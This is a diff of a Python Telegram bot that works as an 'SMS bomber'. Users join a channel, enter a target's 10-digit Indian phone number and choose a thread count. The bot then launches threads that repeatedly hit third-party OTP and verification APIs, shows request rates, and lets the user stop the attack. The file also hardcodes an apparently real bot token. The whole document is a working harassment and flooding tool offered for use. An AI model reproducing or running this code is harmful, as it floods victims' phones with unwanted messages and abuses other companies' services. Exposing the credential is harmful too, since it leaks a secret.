@@ -4,7 +4,6 @@ import requests
 import time
 import threading
 import json
-import math
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
     ApplicationBuilder,
@@ -16,22 +15,22 @@ from telegram.ext import (
 )
 
 BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
-CHANNEL_ID = -1002512368825  # Replace with your actual channel ID
+CHANNEL_ID = -1002512368825  # Replace with your channel ID
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 
-# Global counters for the bomber
+# Global variables
 message_count = 0
 api_counters = {}
-api_repeats = {}  # Tracks how many times each API has repeated
-count_lock = threading.Lock()
-start_time = 0
+status_message = None
 bomber_active = False
+start_time = 0
+count_lock = threading.Lock()
 
-# Complete API configurations (ALL APIs INCLUDED)
+# COMPLETE API CONFIGURATIONS (ALL 12 APIs INCLUDED)
 api_configurations = [
     # POST APIs (40 second interval)
     {
@@ -153,14 +152,40 @@ api_configurations = [
     }
 ]
 
-def api_request_loop(api_config, number, thread_id=None):
-    global message_count, api_counters, api_repeats, bomber_active
+async def update_status(context: ContextTypes.DEFAULT_TYPE):
+    global message_count, api_counters, status_message, bomber_active
+    
+    while bomber_active:
+        with count_lock:
+            current_total = message_count
+            current_api_counts = api_counters.copy()
+        
+        runtime = time.time() - start_time
+        status_text = f"🚀 BOMBER ACTIVE 🚀\n\n"
+        status_text += f"⏱ Runtime: {int(runtime)}s\n"
+        status_text += f"📊 Total Requests: {current_total}\n"
+        status_text += f"⚡ Speed: {current_total/max(1,runtime):.1f} req/s\n\n"
+        status_text += "🔹 Active APIs:\n"
+        
+        for api_name, count in current_api_counts.items():
+            status_text += f"  • {api_name}: {count}\n"
+        
+        try:
+            if status_message:
+                await status_message.edit_text(status_text)
+            await asyncio.sleep(5)
+        except Exception as e:
+            logging.error(f"Status update error: {e}")
+            await asyncio.sleep(5)
+
+def api_request_loop(api_config, number, context):
+    global message_count, api_counters
+    
     api_name = api_config['name']
     
     with count_lock:
         if api_name not in api_counters:
             api_counters[api_name] = 0
-            api_repeats[api_name] = 0
     
     while bomber_active:
         try:
@@ -182,101 +207,61 @@ def api_request_loop(api_config, number, thread_id=None):
             with count_lock:
                 message_count += 1
                 api_counters[api_name] += 1
-                if api_counters[api_name] % 100 == 0:
-                    api_repeats[api_name] += 1
                 
         except Exception as e:
-            logging.error(f"Error in {api_name} thread {thread_id}: {str(e)}")
+            logging.error(f"API {api_name} error: {e}")
         
         time.sleep(api_config['interval'])
 
-def start_bomber(number, boom_threads):
-    global bomber_active, start_time, message_count, api_counters, api_repeats
+async def start_bomber(number, boom_threads, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global bomber_active, start_time, message_count, api_counters, status_message
     
     bomber_active = True
     start_time = time.time()
     message_count = 0
     api_counters = {}
-    api_repeats = {}
     
-    display_thread = threading.Thread(target=display_counters, daemon=True)
-    display_thread.start()
+    # Create status message
+    status_message = await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🚀 Starting bomber..."
+    )
     
+    # Start status updater
+    asyncio.create_task(update_status(context))
+    
+    # Start API threads
     for config in api_configurations:
         threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
         for i in range(threads):
             t = threading.Thread(
                 target=api_request_loop,
-                args=(config, number, i+1),
+                args=(config, number, context),
                 daemon=True
             )
             t.start()
-    logging.info(f"Bomber started on {number} with {boom_threads} threads")
 
-def stop_bomber():
+async def stop_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global bomber_active
     bomber_active = False
-    logging.info("Bomber stopped by user")
-
-def display_counters():
-    global message_count, api_counters, api_repeats, start_time, bomber_active
-    while bomber_active:
-        with count_lock:
-            current_total = message_count
-            current_api_counts = api_counters.copy()
-            current_repeats = api_repeats.copy()
-        
-        runtime = time.time() - start_time
-        output = f"📊 TOTAL REQUESTS: {current_total:,} ({current_total/max(1,runtime):.1f}/sec)\n"
-        output += f"⏱️ Runtime: {runtime:.1f}s\n\n"
-        output += "🔹 ACTIVE API THREADS:\n"
-        
-        for api_name in sorted(current_api_counts.keys()):
-            count = current_api_counts[api_name]
-            repeat = current_repeats.get(api_name, 0)
-            output += f"  {api_name.ljust(20)}: {count:,} (Repeat: {repeat})\n"
-        
-        logging.info(output)
-        time.sleep(5)
+    await update.message.reply_text("🛑 Bomber stopped successfully!")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        if update.callback_query:
-            query = update.callback_query
-            await query.answer()
-            message = query.message
-        else:
-            message = update.message
-
         keyboard = [
             [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
             [InlineKeyboardButton("Check Join", callback_data="check_join")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        if update.callback_query:
-            try:
-                await message.edit_caption(
-                    caption="Welcome! Please join the channel to continue.",
-                    reply_markup=reply_markup
-                )
-            except:
-                await context.bot.send_photo(
-                    chat_id=message.chat_id,
-                    photo="https://t.me/bshshsubjsus/4",
-                    caption="Welcome! Please join the channel to continue.",
-                    reply_markup=reply_markup
-                )
-        else:
-            await message.reply_photo(
-                photo="https://t.me/bshshsubjsus/4",
-                caption="Welcome! Please join the channel to continue.",
-                reply_markup=reply_markup
-            )
+        await update.message.reply_photo(
+            photo="https://t.me/bshshsubjsus/4",
+            caption="Welcome! Please join the channel to continue.",
+            reply_markup=reply_markup
+        )
     except Exception as e:
         logging.error(f"Start error: {e}")
-        if update.message:
-            await update.message.reply_text("An error occurred. Please try again.")
+        await update.message.reply_text("An error occurred. Please try again.")
 
 async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -289,48 +274,29 @@ async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             
-            try:
-                await query.edit_message_caption(
-                    caption="✅ You have joined. Click to start bomber!",
-                    reply_markup=reply_markup
-                )
-            except:
-                await context.bot.send_message(
-                    chat_id=query.message.chat_id,
-                    text="✅ You have joined. Click to start bomber!",
-                    reply_markup=reply_markup
-                )
+            await query.edit_message_caption(
+                caption="✅ You have joined. Click to start bomber!",
+                reply_markup=reply_markup
+            )
         else:
             await query.edit_message_caption(caption="❌ Join the channel first!")
     except Exception as e:
         logging.error(f"Check_join error: {e}")
-        try:
-            await query.answer("Error checking join status", show_alert=True)
-        except:
-            pass
+        await query.answer("Error checking join status", show_alert=True)
 
 async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
         
-        try:
-            await query.edit_message_text(
-                "Send target number (10 digits, no +91/0):"
-            )
-        except:
-            await context.bot.send_message(
-                chat_id=query.message.chat_id,
-                text="Send target number (10 digits, no +91/0):"
-            )
+        await query.edit_message_text(
+            "Send target number (10 digits, no +91/0):"
+        )
         
         context.user_data['awaiting_phone_number'] = True
     except Exception as e:
         logging.error(f"Start_bomber error: {e}")
-        try:
-            await query.answer("Error starting bomber", show_alert=True)
-        except:
-            pass
+        await query.answer("Error starting bomber", show_alert=True)
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
@@ -364,46 +330,24 @@ async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_
         threads = int(data[1])
         phone_number = data[2]
         
-        start_bomber(phone_number, threads)
-        
-        await query.edit_message_text(
-            f"🚀 Bomber started on {phone_number} with {threads} threads!\n\n"
-            "Running in background. Use /stopbomber to stop."
-        )
+        await start_bomber(phone_number, threads, update, context)
+        await query.edit_message_text(f"✅ Bomber started on {phone_number} with {threads} threads")
     except Exception as e:
         logging.error(f"Thread selection error: {e}")
-        try:
-            await query.answer("Error starting bomber", show_alert=True)
-        except:
-            pass
-
-async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stop_bomber()
-    await update.message.reply_text("🛑 Bomber stopped!")
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    logging.error(f"Error: {context.error}")
-    try:
-        if isinstance(update, Update) and update.callback_query:
-            await update.callback_query.answer("Error occurred", show_alert=True)
-        elif isinstance(update, Update) and update.message:
-            await update.message.reply_text("An error occurred")
-    except Exception as e:
-        logging.error(f"Error handler error: {e}")
+        await query.answer("Error starting bomber", show_alert=True)
 
 async def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
-    app.add_error_handler(error_handler)
-    
+    # Add handlers
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
+    app.add_handler(CommandHandler("stopbomber", stop_bomber))
     app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
     app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
     app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    logging.info("Bot running...")
+    logging.info("Bot is running...")
     await app.run_polling()
 
 if __name__ == '__main__':
